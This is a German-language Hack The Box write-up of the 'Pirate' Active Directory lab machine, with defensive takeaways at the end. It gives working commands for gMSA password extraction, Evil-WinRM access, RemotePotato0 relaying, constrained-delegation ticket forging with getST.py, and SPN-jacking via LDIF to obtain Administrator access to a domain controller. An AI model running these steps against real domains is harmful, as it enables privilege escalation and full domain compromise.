# Hack The Box: Pirate Writeup

> Öffentliches Writeup für GitHub. Flags und lokale Secrets sind absichtlich nicht enthalten.

## Überblick

Pirate ist eine Windows/Active-Directory-Maschine mit mehreren AD-spezifischen Stufen. Die Chain beginnt mit schwachen bzw. vorhersehbaren Computer-/Service-Account-Zugängen, führt über gMSA-Managed-Passwords zu WinRM-Footholds und endet mit Resource-/Delegation-Missbrauch sowie SPN-Jacking.

Die finale Privilege Escalation nutzt, dass die Gruppe `IT` das Recht `Validated-SPN` auf Computerobjekten besitzt. Dadurch kann ein delegierbarer SPN temporär von WEB01 auf DC01 verschoben werden. Anschließend lässt sich per Constrained Delegation ein Administrator-Service-Ticket für CIFS/DC01 erhalten und `root.txt` über SMB lesen.

## Recon

Basisdaten:

```text
Domain: PIRATE.HTB / pirate.htb
DC:     DC01
Hosts:  DC01, MS01, WEB01
```

Nützliche erste Prüfungen:

```bash
nmap -Pn -sC -sV -oN nmap.txt <target-ip>
ldapsearch -x -H ldap://<dc-ip> -b 'DC=pirate,DC=htb'
```

Die wichtigsten Hinweise kamen aus LDAP/AD-Enumeration:

- Pre-Windows-2000-kompatibler Computeraccount `MS01$`
- gMSA-Accounts für ADCS/ADFS
- Delegation auf WEB01
- Benutzer/ADM-Account `a.white_adm` in der Gruppe `IT`

## Initialer AD-Zugriff

Ein alter bzw. schwacher Computeraccount konnte genutzt werden, um ein Kerberos-Ticket für `MS01$` zu erhalten. Von dort war LDAP-Enumeration möglich.

Beispielhaft:

```bash
getTGT.py PIRATE.HTB/'MS01$':<legacy-password> -dc-ip <dc-ip>
export KRB5CCNAME=MS01$.ccache
```

Mit diesem Zugriff konnten gMSA-Informationen abgefragt werden. Die relevanten Accounts waren:

```text
gMSA_ADCS_prod$
gMSA_ADFS_prod$
```

Die Managed-Password-Daten lieferten NTLM-Material, mit dem WinRM-Footholds möglich wurden.

## Foothold auf DC01 und WEB01

Mit den gMSA-Hashes konnte Evil-WinRM genutzt werden:

```bash
evil-winrm -i <host> -u 'gMSA_ADFS_prod$' -H <redacted-hash>
```

Auf WEB01 war der Kontext low-privileged:

```text
pirate\gMSA_ADFS_prod$
BUILTIN\Remote Management Users
kein Local Admin
```

Die Shell war trotzdem wichtig für Pivoting und interne Zugriffe.

## Pivot zu WEB01

Da WEB01 intern erreichbar war, wurde ein Reverse-Pivot mit Chisel aufgebaut:

```text
SOCKS:         127.0.0.1:1080
WinRM forward: 127.0.0.1:15985 -> WEB01:5985
SMB forward:   127.0.0.1:1445  -> WEB01:445
```

Ein zusätzlicher lokaler Forward machte SMB bequem erreichbar:

```text
127.0.0.1:445 -> 127.0.0.1:1445 -> WEB01:445
```

## RemotePotato0 und LDAP Relay

Auf WEB01 konnte `RemotePotato0` zusammen mit LDAPS Relay genutzt werden, um den Kontext von `a.white` zu missbrauchen und den ADM-Account zurückzusetzen.

Ablauf grob:

1. LDAPS-Relay vorbereiten
2. RemotePotato0 auf WEB01 triggern
3. Relay gegen LDAP/LDAPS nutzen
4. Passwort von `a.white_adm` setzen

Danach war `a.white_adm` nutzbar.

## Delegation mit a.white_adm

LDAP zeigte:

```text
a.white_adm
  memberOf: IT
  SPN: ADFS/a.white
  msDS-AllowedToDelegateTo:
    http/WEB01.pirate.htb
    HTTP/WEB01
```

Damit war Constrained Delegation möglich. Für den User-Pfad wurde zunächst versucht, `a.white` zu WEB01 per Kerberos-WinRM zu impersonieren:

```bash
getST.py -dc-ip <dc-ip> \
  -spn HTTP/web01.pirate.htb \
  -impersonate a.white \
  'PIRATE.HTB/a.white_adm:<password>'
```

Auf macOS und später auch in einem Linux-Docker-Client gab es jedoch Kerberos-/WinRM-Probleme:

```text
ohne faketime: Clock skew too great
mit faketime:  Invalid token was supplied
```

Da der AD-Pfad korrekt war, wurde WinRM für die finale Flag-Entnahme umgangen.

## User Flag über CIFS statt WinRM

Statt Kerberos-WinRM wurde ein CIFS-Service-Ticket für WEB01 erzeugt:

```bash
getST.py -dc-ip <dc-ip> \
  -spn HTTP/WEB01.pirate.htb \
  -altservice cifs/WEB01 \
  -impersonate Administrator \
  'PIRATE.HTB/a.white_adm:<password>'
```

Danach konnte per SMB über den WEB01-Forward auf das Benutzerprofil zugegriffen werden:

```bash
export KRB5CCNAME=Administrator@cifs_WEB01@PIRATE.HTB.ccache
smbclient.py -k -no-pass -target-ip 127.0.0.1 -port 445 PIRATE.HTB/Administrator@WEB01
```

Pfad:

```text
C$\Users\a.white\Desktop\user.txt
```

Die Flag wurde gelesen, aber im Writeup nicht veröffentlicht.

## Root: SPN-Jacking

Der entscheidende Root-Hebel war ein DACL-Fund. `dacledit.py` zeigte, dass die Gruppe `IT` auf mehreren Computerobjekten `Validated-SPN` schreiben durfte:

```text
Target: DC01$, WEB01$, MS01$
Trustee: IT
Access mask: WriteProperty
Object type: Validated-SPN
```

Da `a.white_adm` Mitglied von `IT` war, konnte ein SPN temporär verschoben werden.

### SPN-Jack

Zuerst wurde der bestehende Zustand per LDAP gesichert. Danach wurde `HTTP/WEB01` von WEB01 entfernt und auf DC01 gesetzt.

LDIF:

```ldif
dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
changetype: modify
delete: servicePrincipalName
servicePrincipalName: HTTP/WEB01
-

dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/WEB01
-
```

Anwenden:

```bash
ldapmodify -x -H ldap://<dc-ip> \
  -D 'a.white_adm@pirate.htb' \
  -w '<password>' \
  -f spnjack-http-web01-to-dc01.ldif
```

Damit zeigt `HTTP/WEB01` nun auf DC01.

### Administrator-Ticket für DC01

Nun konnte ein Ticket als `Administrator` für den delegierten SPN angefordert und auf CIFS/DC01 umgeschrieben werden:

```bash
getST.py -dc-ip <dc-ip> \
  -spn HTTP/WEB01 \
  -altservice cifs/DC01 \
  -impersonate Administrator \
  'PIRATE.HTB/a.white_adm:<password>'
```

Ergebnis:

```text
Administrator@cifs_DC01@PIRATE.HTB.ccache
```

Mit diesem Ticket war SMB-Zugriff auf DC01 möglich:

```bash
export KRB5CCNAME=Administrator@cifs_DC01@PIRATE.HTB.ccache
smbclient.py -k -no-pass -target-ip <dc-ip> PIRATE.HTB/Administrator@DC01
```

Root-Flag-Pfad:

```text
C$\Users\Administrator\Desktop\root.txt
```

Die Flag wurde gelesen, aber im Writeup nicht veröffentlicht.

### Cleanup / Restore

Der SPN-Jack wurde unmittelbar zurückgebaut:

```ldif
dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
changetype: modify
delete: servicePrincipalName
servicePrincipalName: HTTP/WEB01
-

dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/WEB01
-
```

Danach wurde per LDAP verifiziert, dass `HTTP/WEB01` wieder auf WEB01 lag und DC01 den temporären SPN nicht mehr hatte.

## Kill Chain

```text
Pre-Windows-2000 / legacy computer account
  -> MS01$ Kerberos access
  -> gMSA managed password retrieval
  -> WinRM footholds as gMSA accounts
  -> WEB01 pivot
  -> RemotePotato0 + LDAPS relay
  -> reset/use a.white_adm
  -> Constrained Delegation to WEB01
  -> IT group has Validated-SPN write on computer objects
  -> temporary SPN-jack HTTP/WEB01 from WEB01 to DC01
  -> S4U2Proxy as Administrator + altservice cifs/DC01
  -> SMB read of root.txt
```

## Takeaways

- Pre-Windows-2000-compatible accounts can be dangerous if predictable credentials remain valid.
- gMSA read rights should be tightly scoped and monitored.
- Constrained Delegation becomes especially dangerous when combined with SPN write primitives.
- `Validated-SPN` write access on computer objects is enough for practical SPN-Jacking.
- Always restore AD changes after testing in a lab to avoid leaving the environment in a modified state.
- Kerberos WinRM can be brittle across platforms; Impacket SMB with service tickets is often a reliable fallback.

## Empfehlungen

- Disable or audit Pre-Windows-2000-compatible account paths.
- Review who can read gMSA managed passwords.
- Audit `msDS-AllowedToDelegateTo` and all accounts with SPNs.
- Remove unnecessary `Validated-SPN` write permissions from helpdesk/IT groups.
- Monitor SPN changes on Tier-0 assets and domain controllers.
- Alert on unusual S4U2Proxy and service-ticket activity involving privileged users.
